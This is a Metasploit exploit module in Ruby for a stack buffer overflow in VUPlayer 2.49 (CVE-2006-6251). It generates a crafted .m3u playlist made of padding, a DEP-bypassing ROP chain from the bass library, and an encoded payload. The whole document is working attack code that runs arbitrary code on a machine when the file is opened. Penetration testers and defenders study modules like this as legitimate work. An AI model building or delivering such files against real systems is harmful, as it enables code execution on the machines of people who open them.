##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::RopDb

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'VUPlayer M3U Buffer Overflow(Bypass DEP)',
      'Description'    => %q{
          This module exploits a stack over flow in VUPlayer <= 2.49. When
          the application is used to open a specially crafted m3u file, an buffer is overwritten allowing
          for the execution of arbitrary code.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 
			'hyunmini', # MSF Module(bypass DEP)
			'MC'        # orig
		],
      'References'     =>
        [
          [ 'CVE', '2006-6251' ],
          [ 'OSVDB', '31710' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'DisablePayloadHandler' => 'true',
        },
      'Payload'        =>
        {
          'Space'    => 3000,
          'BadChars' => "\x00",
		  'EncoderType' => Msf::Encoder::Type::SingleStaticBit,
          'DisableNops'  =>  'True',
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'VUPlayer 2.49', { } ],
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Aug 18 2009',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME',   [ false, 'The file name.',  'msf.m3u']),
      ], self.class)
  end

  def exploit

	rop_chain = generate_rop_payload('bass', '')

    m3u = rand_text_alpha_upper(1012)

    m3u << rop_chain
    m3u << payload.encoded

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(m3u)

  end

end